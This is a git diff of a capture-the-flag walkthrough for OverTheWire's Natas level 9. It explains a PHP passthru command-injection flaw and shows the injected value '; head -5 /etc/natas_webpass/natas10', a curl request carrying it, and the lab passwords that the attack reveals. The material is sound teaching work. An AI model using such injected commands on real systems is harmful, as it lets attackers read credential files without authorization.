@@ -1,7 +1,7 @@
-### natas9 pswd: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+### natas9 pswd: UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
 
 ```bash
-curl -v -s -c cookie.txt -X POST http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewire.org
+curl -v -s -c cookie.txt -X POST http://natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9@natas9.natas.labs.overthewire.org
 
 # <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 
@@ -11,7 +11,7 @@ curl -v -s -c cookie.txt -X POST http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@
 - view source with curl
 
 ```bash
-curl -s http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
+curl -s http://natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9@natas9.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
 
 # <body>
 # <h1>natas9</h1>
@@ -84,7 +84,7 @@ The webserver usually just reads the HTML file and sends it to the user.
 The webserver executes the code inside the PHP environment and sends **only** the result of the code to the user.
 
 
-### 1. What is displayed and what variable the form is creating?
+### 1. The HTML form
 
 ```html
 Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
@@ -121,22 +121,22 @@ if($key != "") {
 - if `$key` is not empty we execute `passthru`
 - `passthru` is a dangerous php function, it passes the value in parentheses and runs as a command on the linux terminal and passes the terminal's raw output directly back to the web page => e.g. entering "app" in the textbox we're going to list all the words in our `dictionary.txt` that contain the "app" string.
 
-> **Note1:** since the user's input (`$key`) is dropped directly in the `passthru` without clean or escape => this is our chance.
+> **Note1:** since the user's input (`$key`) is dropped directly in the `passthru` without clean or escape => this is our attack possibility.
 
 > **Note2:** In the Natas wargames the passwords are stored in the directory `/etc/natas_webpass/` and the password for *natas10* is stored in the file `/etc/natas_webpass/natas10`  \
 By default we can read only the current level password (`natas9` in our case) but we'll give it a try with `natas10` maybe the admin gods were generous enough with us to let us have a peak in the future ;-)
 
-- entering `; cat /etc/natas_webpass/natas10` the command sent to the webserver linux terminal will be
+- entering `; head -5 /etc/natas_webpass/natas10` the command sent to the webserver linux terminal will be
 ```bash
 grep -i ; head -5 /etc/natas_webpass/natas10 dictionary.txt
 ```
 
 The terminal will process 2 commands:
 1. `grep -i ;` - this will fail because it has no search term (the fault code/message is not forwarded to the browser)
-2. `head -5 /etc/natas_webpass/natas10 dictionary.txt` - this will display the first 5 lines of the `natas10` and the `dictionary.txt` files.
+2. `head -5 /etc/natas_webpass/natas10 dictionary.txt` - this will display the first 5 lines of the `natas10` and 5 lines from `dictionary.txt` files.
 
 ```bash
-curl 'http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewire.org/?needle=%3B+head+-5+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search'  
+curl 'http://natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9@natas9.natas.labs.overthewire.org/?needle=%3B+head+-5+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search'
 # <html>
 # <head>
 # <body>
@@ -150,7 +150,7 @@ curl 'http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewi
 # Output:
 # <pre>
 # ==> /etc/natas_webpass/natas10 <==
-  t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+  EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
 # 
 # ==> dictionary.txt <==
 # 
